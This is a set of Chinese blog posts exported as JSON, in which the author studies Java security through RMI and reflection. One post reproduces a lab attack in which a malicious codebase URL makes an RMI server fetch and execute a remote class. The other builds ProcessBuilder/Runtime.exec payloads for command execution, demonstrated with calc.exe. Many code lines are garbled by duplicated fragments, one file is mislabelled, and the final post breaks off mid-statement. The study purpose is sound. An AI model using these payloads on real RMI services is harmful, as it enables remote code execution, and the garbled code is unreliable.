[{"id":"424a81b28b15c5b3a4612243a8ecf368","title":"Java安全[RMI(3)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n","slug":"Java安全[RMI(3)]","date":"2023-10-17T14:36:06.745Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"bf4e441f0b57ac113941eef982a20893","title":"Java安全[RMI(2)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n\n从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：\n\n\n\n\n\n\n\n\n\n\nRMI Registry\nRMI Server\nRMI Client\n\n但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分：\nLocateRegistry.createRegistry(LocateRegistry.createRegistry(1099);\nNaming.bind(\"rmi://127.0.0.1:1099/Hello\", new RemoteHelloWorld());\n\n上述代码中，第一行是创建并运行RMI Registry，第二行是将RemoteHelloWorld对象绑定到Hello这个Name上。\nNaming.bind的第一个参数是url，格式为rmi://host:post/name。这里的host和post就是RMI Registry的地址和端口，name就是远程对象绑定的名字。\n不过，如果RMI Registry在本地运行，那么host和port是可以省略的，host默认为localhost，port默认是1099\n直接保留name就行，\nNaming.bind(&quot;Hello&quot;,new Naming.bind(&quot;Hello&quot;,new RemoteHelloWorld());\n\n第一篇大致讲了RMI整体的原理和流程，那么接下来自然要想到RMI会有哪些安全问题，可以分为两个方向\n\n\n\n\n\n\n\n\n\n\n如果我们能够访问RMI Registry，将如何对其进行攻击？\n如果我们可以控制目标RMI客户端中的Naming.lookup的第一个参数，也就是RMI Registry的地址和端口，能不能进行攻击？\n\nJava安全[RMI(2)]\n\n\n\n\n\n\n\n\n复现文章过程中遇到了很多问题，本文不全展示，请自行理解和搜索，动手操作学到更多\n如何攻击RMI Registry?从第一篇RMI文章中提到，服务器端用Naming.rebind绑定对象。比如下面代码就将RemoteHelloWorld类实例绑定在Registry中的Hello名上，192.168.135.142:1099是RMI Registry的地址和端口\nRemoteHelloWorld h = new RemoteHelloWorld h = new RemoteHelloWorld();\nNaming.bind(\"rmi://192.168.169.131:1099/Hello\", h);\n\n我们同时也知道在客户端也可以调用Naming，并且可以在RMI Registry中进行lookup查找，如果客户端也进行rebind，可不可以将Hello对应的对象修改覆盖掉呢？\n可以先在本机上启动一个类似的server绑定虚拟机里的Registry，\n\n但是发生报错，提示当前并非localhost\n\n\n\n\n\n\n\n\n\n\n这也是因为Java对远程访问RMI Registry做了限制，只有当请求访问的源地址是localhost时候，才可以进行调用rebind,bind,unbind等方法。\n\n\n\n\n\n\n\n\n\n不过如果至少单纯列出绑定对象或者查找绑定对象，是没有这个限制的，如list和lookup方法是可以远程调用的。\n为了更加直观，现在虚拟机的服务器端，绑定了三个Name\n\n客户端代码\npackage RMI_2;\n\nimport java.rmi.Naming;\nimport java.util.Arrays;\n\npublic class RMI_Client_list &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String[] s = Naming.list(\"rmi://192.168.169.131:1099\");\n        System.out.println(Arrays.toString(s));\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n\nlookup作用就是获得某个远程对象。那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具 https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。 但是显然，RMI的攻击面绝不仅仅是这样没营养。\nRMI利用codebase执行任意代码大部分的Java的漏洞都是远程进行利用恶意类，但是在怎么让目标服务器能够下载并加载自己的恶意服务器上的恶意类，这里就涉及到了codebase。\n曾经浏览器可以直接运行java，就是通过Applet标签，但是在HTML5中不再支持，并在HTML 4.01 中不赞成使用 &lt;applet&gt; 元素。\n\n\n\n\n\n\n\n\n\nApplet 是一种 Java 程序。它一般运行在支持 Java 的 Web 浏览器内。因为它有完整的 Java API支持,所以Applet 是一个全功能的 Java 应用程序。\n&lt;applet&gt; 标签在 HTML 4 中用于定义嵌入式小程序（插件）。\n使用Applet的时候通常需要指定一个codebase属性，如下\n&lt;applet code=&quot;HelloWorld.class&quot; codebase=&quot;Applets&quot; width=&quot;800&quot; height=&lt;applet code=&quot;HelloWorld.class&quot; codebase=&quot;Applets&quot; width=&quot;800&quot; height=\"600\">\napplet>\n\n在RMI中远程加载时也同时涉及到了codebase\n\n\n\n\n\n\n\n\n\ncodebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。\n如果指定codebase=http://example.com/，然后加载org.vulhub.example.Example 类，则java虚拟机就会下载http://example.com/org/vulhub/example/Example.class，并作为Example类的字节码。\n在RMI中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，它会先从自己的CLASSPATH中进行寻找对应的类，如果在本地还是找不到，就会远程去加载codebase中的类。\n所以如果codebase被控制，那么我们写上我们恶意类的CLASSPATH，当服务端本地加载不到的时候，就会通过我们控制的codebase下载恶意类，最后达到加载恶意类的目的。\n\n\n\n\n\n\n\n\n\n在RMI中，codebase可以随着序列化数据一起传输，服务端接收到这个数据后，就先在CLASSPATH中寻找，然后去指定的codebase寻找类。最后就可能被codebase指向的恶意类控制导致被getshell或者任意命令执行。\n环境配置和代码编写环境配置，只有满足如下条件的RMI服务器才能被攻击\n\n\n\n\n\n\n\n\n\n\n安装并配置了SecurityManager \n\nJava版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false\n\n\n\n\n\n\n\n\n\n\n\n其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置： \n\nhttps://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html \nhttps://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html\n\n我的环境\n\n\n\n\n\n\n\n\n\n配置环境犯了个低级错误，客户端的java版本太高，编译出来的类文件无法被服务器的低版本java虚拟机加载，导致codebase指向的恶意类无法被正确加载\n\n\n\n\n\n\n\n\n\n服务端：\n\nip: 192.168.169.136\njava 17.5\n\n客户端：\n\nip: 192.168.169.1\njava 17.0.5\n\n服务端的四个文件，\n// RemoteRMIServer.java\npackage RMI_2;\n\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\npublic class RemoteRMIServer &#123;\n    private void start() throws Exception &#123;\n        if (System.getSecurityManager() == null) &#123;\n            System.out.println(\"setup SecurityManager\");\n            System.setSecurityManager(new SecurityManager());\n        &#125;\n        Calc h = new Calc();\n        LocateRegistry.createRegistry(1099);\n        Naming.rebind(\"refObj\", h);\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RemoteRMIServer().start();\n    &#125;\n&#125;\n\n// Calc.java\npackage RMI_2;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n    public Integer sum(List params) throws RemoteException;\n&#125;\n\n// ICalc.java\npackage RMI_2;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n    public Integer sum(List params) throws RemoteException;\n&#125;\n\n// client.policy\ngrant &#123;\npermission java.security.AllPermission;\n&#125;;\n\n\n然后编译三个java文件，并运行服务端\njavac *\n\njava -Djava.rmi.server.hostname=192.168.169.136 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy -cp E:\\Java_Study\\src\\main\\java RMI_2.RemoteRMIServer\n\n\n\n\n\n\n\n\n\n\n*注意，第二段命令我是在cmd中运行，如果在powershell中运行需要把-D和java用引号分开，如\njava -D&quot;java.rmi.server.hostname=192.168.169.136&quot; -D&quot;java.rmi.server.useCodebaseOnly=false&quot; -D&quot;java.security.policy=client.policy&quot; -java -D&quot;java.rmi.server.hostname=192.168.169.136&quot; -D&quot;java.rmi.server.useCodebaseOnly=false&quot; -D&quot;java.security.policy=client.policy&quot; -cp E:\\Java_Study\\src\\main\\java RMI_2.RemoteRMIServer\n执行后如下图，client.policy文件用于配置协议关闭java.security，\n执行时加上java.rmi.server.useCodebaseOnly=false允许服务端从RMI请求中获取加载codebase，若为true则java虚拟机将只信任预先配置好的codebase。\njava.rmi.server.hostname=192.168.168.131为服务端ip，也是客户端要访问的ip\n\n然后编写客户端，根据服务端文件的代码，指定这是一个运算加法的服务端，然后还有个ICalc接口文件，将其和客户端文件一个目录下。\n客户端代码【p神的代码稍微在我环境下有点错误】\n\n主要是其中Payload这个内部类报错，因为在RMI中类是序列化传递的，如果内部类要被序列化传递，它必须是static的，否则会导致序列化问题。\n\n\n\n\n\n\n\n\n\n内部类不能被序列化！\n看到它是继承ArrayList，直接用ArrayList即可\npackage RMI_2;\n\nimport java.rmi.Naming;\nimport java.util.List;\nimport java.util.ArrayList;\nimport java.io.Serializable;\npublic class RMIClient implements Serializable &#123;\n-   public class Payload extends ArrayList &#123;\n-   &#125;\n    public void lookup() throws Exception &#123;\n        ICalc r = (ICalc)\n                Naming.lookup(\"rmi://192.168.169.136:1099/refObj\");\n-       List li = new Payload();\n+       List li = new ArrayList();\n        li.add(3);\n        li.add(4);\n        System.out.println(r.sum(li));\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RMIClient().lookup();\n    &#125;\n&#125;\n\n正常运行，发送到服务端，返回3，4相加后的结果7\n\n指定codebase客户端再在RMI中指定codebase，向服务器发送请求，\njava -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http:java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ -cp E:\\Ttoc\\Desktop\\JAVA\\JAVA_Study\\src\\main\\java RMIClient.java\n\n客户端先向远程对象发送codebase，并告诉了查询的类名称\n\n发现果然服务端通过客户端发送的codebase信息，到目标网站下进行寻找访问类，User-Agent就是服务端的java虚拟机。\n\n最后example.com响应返回404\n\n当然这里如果代码和p神一样也是可以的，还可以看到服务端也查找了内部类RMIClient$Payload，只不过客户端最后输出会报错，但是客户端还是成功把codebase发送给了服务端，服务端也在底下寻找内部类\n\n\n\n\n\n\n\n\n\n可以从下方返回的数据包的顺序，知道服务器先寻找内部类，再寻找外部类\n\n加载恶意类上面的流量分析知道服务端的java虚拟机确实会访问codebase的类文件，所以我们只需要把/RMIClient$Payload.class 改成恶意类即可，当然在RMIClient中写上恶意类也可以，这里以在内部类Payload为例子\n加上恶意类后的代码\npackage RMI_2;\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.rmi.Naming;\nimport java.util.ArrayList;\nimport java.util.List;\npublic class RMIClient implements Serializable &#123;\n    public class Payload extends ArrayList &#123;\n        static &#123;\n            try &#123;\n                Runtime rt = Runtime.getRuntime();\n                String commands = \"calc.exe\";\n                Process p = rt.exec(commands);\n                p.waitFor();\n            &#125; catch (IOException | InterruptedException e) &#123;\n                e.printStackTrace();\n            &#125;\n        &#125;\n    &#125;\n    public void lookup() throws Exception &#123;\n        ICalc r = (ICalc)\n                Naming.lookup(\"rmi://192.168.169.146:1099/refObj\");\n        List li = new Payload();\n        li.add(3);\n        li.add(4);\n        System.out.println(r.sum(li));\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RMIClient().lookup();\n    &#125;\n&#125;\n\n重新编译生成类文件\njavac *.java\n\n\n\n\n\n\n\n\n\n\n\n这里遇到一个坑，因为Payload是内部类，其本质还是为RMIClient$Payload\n而这里，我将恶意类写在了内部类中，所以最后服务端要执行内部类的静态方法也就是我们的恶意方法，还需要加载外部类RMIClient，所以我们需要将内部类RMIClient$Payload和外部类RMIClient都放在恶意服务器等着服务端加载\n如果将恶意方法写在外部类中，就只有把外部类RMIClient放在恶意服务器上等着服务端加载就可以执行\npackage RMI_2;\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.rmi.Naming;\nimport java.util.ArrayList;\nimport java.util.List;\npublic class RMIClient implements Serializable &#123;\n    static &#123;\n        try &#123;\n            Runtime rt = Runtime.getRuntime();\n            String commands = \"calc.exe\";\n            Process p = rt.exec(commands);\n            p.waitFor();\n        &#125; catch (IOException | InterruptedException e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n    public class Payload extends ArrayList &#123;\n    &#125;\n    public void lookup() throws Exception &#123;\n        ICalc r = (ICalc)\n                Naming.lookup(\"rmi://192.168.169.146:1099/refObj\");\n        List li = new Payload();\n        li.add(3);\n        li.add(4);\n        System.out.println(r.sum(li));\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RMIClient().lookup();\n    &#125;\n&#125;\n\n\n\n因为服务端是虚拟机中运行，我直接在物理机用wsl安装apache2上把这两个类文件放上去(为什么放两个类，原因见上)\n\n记得目录必须按照格式需要为包名\n修改上面的example.com为wsl的ip即可\njava -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http:java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://x.x.x.x/ -cp E:\\Ttoc\\Desktop\\JAVA\\JAVA_Study\\src\\main\\java RMIClient.java\n\n可以看到访问成功，\n\n网站也将类的内容返回给java-vm\n\n查看服务端\n\n执行成功\n\n*注意，进行RMI时，客户端接口文件的包名必须和服务器包名必须一样\n如下，在RMI_2包中，我的接口文件的包名也是RMI_2，但是服务端的接口文件包名是RMI_1\n客户端：\n\n服务端：\n\n报错，\n\n\n\n\n\n\n\n\n\n\n这个异常是由于Java模块化系统引入的。在Java 9及更高版本中，引入了模块化系统，它会对类加载和模块之间的依赖关系进行更严格的控制。这个异常消息表明你正在尝试将一个接口从一个模块加载到另一个模块，而两者之间可能存在访问限制。\n解决这个问题的方法之一是确保你的RMI接口和实现都在相同的模块中，或者在相同的模块路径下。这样，它们将属于同一模块，不会出现模块之间的访问问题。\n所以，只客户端只需要导入RMI_1包中的接口，就可以成功访问到服务端。\n\n\n","slug":"Java安全[RMI(2)]","date":"2023-09-17T03:11:46.797Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"08342c15e5fd5518f82b3bdc69d78190","title":"Java安全[RMI(1)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n\n熟悉的名字，在CVE学习中，其中Apache solr 的log4j漏洞和weblogic远程代码执行都提到了RMI，作用如名， RMI（remote method invocation）即远程方法调用。\n\nJava安全[RMI(1)]RMI的目标其实和RPC类似，是让某个Java虚拟机上的对象调用另一个Java虚拟机上的方法，只不过RMI是Java中独有的一种机制。\n\n\n\n\n\n\n\n\n\nRPC（Remote Procedure Call）是远程过程调用协议，是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。\n在分布式计算中，RPC允许运行于一台计算机的程序调用另一个地址空间的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程。RPC是一种CS模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。\n既然是远程调用，那么肯定是存在谁调用谁的关系，这就构成了RMI Server和RMI Client，在Server中实现远程调用的函数和接口，而Client需要知道想要调用方法的接口，然后访问执行即可。\nRMIServer⼀个RMI Server分为三部分：\n\n\n\n\n\n\n\n\n\n\n⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() \n⼀个实现了此接⼝的类\n⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。\n\n先编写一个RMI Server\npackage RMI_1;\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\npublic class RMIServer &#123;\n    public interface IRemoteHelloWorld extends Remote &#123;\n        String hello(String s) throws RemoteException;\n    &#125;\n    public class RemoteHelloWorld extends UnicastRemoteObject implements\n            IRemoteHelloWorld &#123;\n        protected RemoteHelloWorld() throws RemoteException &#123;\n            super();\n        &#125;\n        public String hello(String s) throws RemoteException &#123;\n            System.out.println(\"call from\");\n            return \"Hello\"+s;\n        &#125;\n    &#125;\n    private void start() throws Exception &#123;\n        RemoteHelloWorld h = new RemoteHelloWorld();\n        LocateRegistry.createRegistry(1099);\n        Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h);\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RMIServer().start();\n    &#125;\n&#125;\n\n分析一下代码，\n\n接口定义\n\n先定义一个名为IRemoteHelloWorld的接口，它扩展了Remote接口，这是RMI中的一个标记接口。接口声明了一个hello()方法，该方法可以抛出RemoteException异常，这个接口定义了一个远程方法，客户端可以通过RMI调用它。\npublic interface IRemoteHelloWorld extends public interface IRemoteHelloWorld extends Remote &#123;\n        public String hello(String s) throws RemoteException;\n    &#125;\n\n\n远程对象的实现\n\n这里定义了一个名为RemoteHelloWorld类，实现了IRemoteHelloWorld接口并继承UnicastRemoteObject类。这个类的构造函数调用父类，也就是UnicastRemoteObject类的构造函数，用于创建一个远程对象。RemoteHelloWorld还实现了hello()方法，该方法奖打印一条消息call from，并返回Hello World给调用该方法的对象(如，客户端服务器)。\npublic class RemoteHelloWorld extends UnicastRemoteObject public class RemoteHelloWorld extends UnicastRemoteObject implements\n        IRemoteHelloWorld &#123;\n    protected RemoteHelloWorld() throws RemoteException &#123;\n        super();\n    &#125;\n    public String hello(String s) throws RemoteException &#123;\n        System.out.println(\"call from\");\n        return \"Hello\"+s;\n    &#125;\n&#125;\n\n\n启动RMI服务器方法定义和执行\n\nstart() 方法用于启动RMI服务器。\n\n创建一个 RemoteHelloWorld 实例 h，这个实例将充当远程对象。\n通过 LocateRegistry.createRegistry(1099) 创建了一个RMI注册表，并指定它监听在1099端口上。\n使用 Naming.rebind() 将远程对象 h 绑定到了 rmi://127.0.0.1:1099/Hello 这个名称下。\n\npublic class public class RMIServer &#123;\n    private void start() throws Exception &#123;\n        RemoteHelloWorld h = new RemoteHelloWorld();\n        LocateRegistry.createRegistry(1099);\n        Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h);\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        new RMIServer().start();\n    &#125;\n&#125;\n\n\nmain方法\n\n创建RMIServer的实例，并调用start()方法启动RMIServer。\nRMIClientRMI客户端相比于RMI服务端的代码就简单一点，只需要访问调用服务端的远程方法即可\npackage RMI_1;\nimport java.rmi.Naming;\npublic class TrainMain &#123;\n    public static void main(String[] args) throws Exception &#123;\n        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)\n                Naming.lookup(\"rmi://10.19.16.44:1099/Hello\");\n        String ret = hello.hello(\"Ttoc\");\n        System.out.println(ret);\n    &#125;\n&#125;\n\n这里展示的只是本地进行调用RMIServer，要实现真正的RMI，客户端需要服务端提供接口实现方式，如上面代码所示的IRemoteHelloWorld，一般不会把接口和实现都包含在一个类中，而是分开多个文件，这里是为了方便。\n客户端只需要接口打包成jar，这样就能知道RMI可以调用的方法有哪些，并知道服务端的ip和端口即可，然后使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了。\n\njar打包命令，这就实现了把接口打包的结果\n\n最后在IDEA中将包加到项目结构里即可。\n\n\nRMI流量分析用wireshark抓包看看RMI的通讯数据原理\n为了方便直观看出服务端和客户端，于是用虚拟机跑服务端，主机跑客户端，这里就不会两个ip都是一样的了\n\n\n\n\n\n\n\n\n\n服务端ip：192.168.169.131\n客户端ip：192.168.126.1(实际ip为 10.19.16.44，但是由于主机是通过虚拟机网卡访问的所以，抓虚拟机网卡的流量包时，网卡ip就是主机的)\n这里将IRemoteHelloWorld独立为一个文件，所以客户端代码有点不一样，服务端删不删IRemoteHelloWorld都一样\npackage RMI_1;\nimport java.rmi.Naming;\n\npublic class RMI_Client &#123;\n    public static void main(String[] args) throws Exception &#123;\n        IRemoteHelloWorld hello = (IRemoteHelloWorld)\n                  Naming.lookup(\"rmi://192.168.169.131:1099/Hello\");\n        String ret = hello.hello(\"Ttoc\");\n        System.out.println(ret);\n    &#125;\n&#125;\n\n\n抓个流量包看看，\n\n可以看到整体的过程中发生了两次tcp握手[灰色部分]，也就是在实际情况下构成了两次tcp连接。\n第一次是从客户端的19581端口访问服务器的1099端口，第二次是客户端的19584端口访问55947端口\n其实第一次握手很容易理解，因为我们的客户端设置的就是访问服务端的1099端口，但是为什么后面会莫名其妙访问服务端的55947端口呢\n在流量包的JRMI Return Data中，也就是服务端向客户端发送的流量中可以看到，在最后的服务端ip后面的一个字节\\x00\\x00\\xda\\x8b\n\n通过进制转化可以看到，这个字节正好是55947的对应的网络序列，这也就是为什么客户端会向服务器端的55947端口进行tcp握手。\n\n但其实这段数据中，从\\xAC\\xED开始后，后面的所有数据都属于Java序列化的内容，其中的ip和端口只是这个对象的一部分。\n\n其实可以简单总结一下RMI的流程，\n首先客户端访问连接Registry，并在其中寻找Name名为Hello的对象，这个过程对应数据包中的JRMI,Call。\n而后Registry向客户端发送一串反序列化字符串，代表找到了Name=Hello的对象，这个过程对应数据包中的JRMI,ReturnData。\n客户端反序列化JRMI,ReturnData，发现该对象是一个远程对象，地址是192.168.169.131:55947，于是再与这个地址建立TCP连接，在这个新的连接中，才可以执行真正远程方法调用，也就是hello()。\n可以从下图直观的认识到RMI中各个元素的关系。\n\n（底下是RMI，单词写错了应该是invocation)\n可以从先从RMI Server开始看，服务端先到RMI Registry上注册了一个Name的对象绑定关系；【如下代码，将RemoteHelloWorld类实例化，然后将其绑定到Hello这个Name上，这就是绑定，然后告诉Registry，这个对象能通过访问给定的名称进行访问】\nRemoteHelloWorld h = new RemoteHelloWorld h = new RemoteHelloWorld();\nLocateRegistry.createRegistry(1099);\nNaming.rebind(\"rmi://127.0.0.1:1099/Hello\", h);\n\nRMI Registry相当于一个网关，它本身虽然绑定了远程需要调用的对象，但是它自己是不会执行远程方法的。\n而后是RMI Client，当它知道Name后，会向RMI Registry发送查询请求【如下代码，客户端这里用服务器给的对应的调用的接口IRemoteHelloWorld，创建对象hello，然后向RMI Registry发送想要调用的注册名字，RMI Registry使用这个信息来查找并返回相应的远程对象引用】\nIRemoteHelloWorld hello = (IRemoteHelloWorld) Naming.lookup(IRemoteHelloWorld hello = (IRemoteHelloWorld) Naming.lookup(\"rmi://192.168.169.131:1099/Hello\");\n\n得到远程方法的绑定关系，然后通过这个绑定关系再次连接RMI Server；\nString ret = hello.hello(String ret = hello.hello(\"Ttoc\");\n\n这里hello就是获得了RemoteHelloWorld类的远程对象引用，然后用hello.hello(&quot;Ttoc&quot;)进行调用这个类中的hello方法。而这个方法的调用会通过网络发送到服务器端，服务器端会执行对应方法，并将结果返回客户端。这个过程中RMI框架起到的作用就是处理网络通信，序列化，反序列化等细节，使得客户端和服务器之间的通信就像是在本地方法执行一样，但是本质还是在服务器端进行的执行。\n","slug":"Java安全[RMI(1)]","date":"2023-09-10T14:13:37.943Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"8c22bcc128dc13c7c13ac9d40b733df9","title":"Java安全[反射(3)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n\nJava安全[反射(3)]本文要点\n\n\n\n\n\n\n\n\n\nJava执行命令的方法ProcessBuilder \n反射中使用getConstructor获取构造有参构造函数 \n可变长参数（varargs）在反射中的意义与使用 \ngetDeclared系列反射函数和普通反射的区别于使用\n\n并解决第二篇的两个问题，\n\n\n\n\n\n\n\n\n\n\n如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？\n如果一个方法或构造方法是私有方法，我们是否能执行它呢？\n\ngetConstructor反射方法&#x2F;ProcessBulider执行命令第一个问题\n\n\n\n\n\n\n\n\n\n如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？\n我们需要用到一个新的反射方法getConstructor。\n与getMethod类似，getConstructor接收参数是构造函数的列表类型。因为构造函数也支持重载，所以可能会存在多个构造函数，所以必须用参数列表类型才能唯一确认一个构造函数。\n获取了构造函数后，使用newInstance来执行。\n比如，我们常用的另一个执行命令的方式ProcessBulider，\n\n\n\n\n\n\n\n\n\n下面是一个简单的ProcessBuilder使用流程：\n\n创建一个ProcessBuilder实例：\nProcessBuilder pb = new ProcessBuilder pb = new ProcessBuilder();\n\n设置命令和参数：\npb.command(&quot;myCommand&quot;, &quot;myArg1&quot;, pb.command(&quot;myCommand&quot;, &quot;myArg1&quot;, \"myArg2\");\n\n（可选）设置其他属性，如工作目录、环境变量等。\n\n启动进程：\nProcess process Process process = pb.start();\n\n等待进程完成并获取退出值：\nint exitValue int exitValue = process.waitFor();\n\n我们使用getConstructor来获取其构造函数，然后调用start()来执行命令。\nClass clazz = Class.forName(Class clazz = Class.forName(\"java.lang.ProcessBuilder\");\n((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n这里的ProcessBuilder类的构造函数有两个，而且都是有参数的\n\n\n\n\n\n\n\n\n\n\npublic ProcessBuilder(String... command)\npublic ProcessBuilder(List&lt;String&gt; command)\n\n这里用到的是第二个构造函数，也可以看到构造函数的参数就是command，也就是执行的命令需要在实例化的时候传入。\n\n\n\n\n\n\n\n\n\n\nList.class和之前 前两篇提到的String.class一样，指的是调用方法的参数类型。\nList.class指的就算List接口类的Class对象\nString.class表示 String类的Class对象\n\n\n\n\n\n\n\n\n\n在这段代码中，List.class 被用作参数传递给 getConstructor() 方法，以获取一个接受 List 类型参数的构造函数。这意味着我们正在查找一个构造函数，它接受一个 List 对象作为参数，并使用该 List 对象来初始化新创建的 ProcessBuilder 实例。于是就找到了第二个构造函数，这样，我们就可以动态地创建并启动一个新进程。\n\n避免利用强类型转换但是我们在payload中用到了Java中的强类型转换【((ProcessBuilder) xxx)】，有时候我们利用漏洞的时候(在表达式上下文)是没有这种语法的。所以我们仍然需要反射来完成这一步。\n\n\n\n\n\n\n\n\n\n其中有个Arrays.asList其实也好理解，就算将参数从数组转换为列表，使其符合构造函数的参数类型，然后newInstance时将参数传进去执行。\n((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n\n\n其实也很好改这个payload，这里需要用到强类型转化的原因主要是因为执行.start()方法启动进程的时候，前部分不用强类型包含起来，无法找到这个方法，会在Object类中寻找。\n\n这里可以直接用反射中getMethod方法获取start方法，就可以避免这种问题，然后invoke执行，因为start的是一个普通方法，所以invoke的第一个参数就是ProcessBuilder类实例。\nClass&lt;?&gt; clazz = Class.forName(Class&lt;?&gt; clazz = Class.forName(\"java.lang.ProcessBuilder\");\nclazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n\n\n执行结果，\n\n\n可变长参数（varargs）在反射中的意义与使用那么，如果想要用ProcessBuilder的第一个构造函数，又应该怎么实现反射呢？\npublic ProcessBuilderpublic ProcessBuilder(String... command)\n\n这里涉及到Java的变长参数了，和其他语言一样，Java中也支持可变长参数，就算当你在定义函数时，在设置参数时，不确定参数的个数时，可以用 ... 来表示这个函数的参数个数是可以变的。其实就是和数组差不多的含义。\n而且实际上，对于变长参数，Java在编译的时候会编译成一个一维数组，也就是说，对于如下两段代码在底层上是一致的，也就是说无法重载，见下图可知。\npublic void hellopublic void hello(String[] names) &#123;&#125;\npublic void hello(String... names) &#123;&#125;\n\n\n也就是说，如果有个数组，想传给hello函数，直接传入数组即可\nString[] names = &#123;&quot;hello&quot;, String[] names = &#123;&quot;hello&quot;, \"world\"&#125;;\nhello(names);\n\n所以，我们将字符串数组的类String[].class传给getConstructor，就可以查找获取ProcessBuilder的第二种构造函数：\nclass clazz = Class.forName(class clazz = Class.forName(\"java.lang.ProcessBulider\");\nclazz.getConstructor(String[].class);\n\n但是在通过newInstance传参时，就有不同了，因为ProcessBulider的第一个构造函数的参数是变长参数，也就是一维数组，而newInstance的参数也是变长参数，同样也是一维数组，如下图，所以想通过如果想传参成功，就是一个一维数组中元素为一维数组 &#x3D;&#x3D;&gt; 也就是二维数组。\n\n于是构造payload如下，\nClass&lt;?&gt; clazz = Class.forName(Class&lt;?&gt; clazz = Class.forName(\"java.lang.ProcessBuilder\");\n       ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new 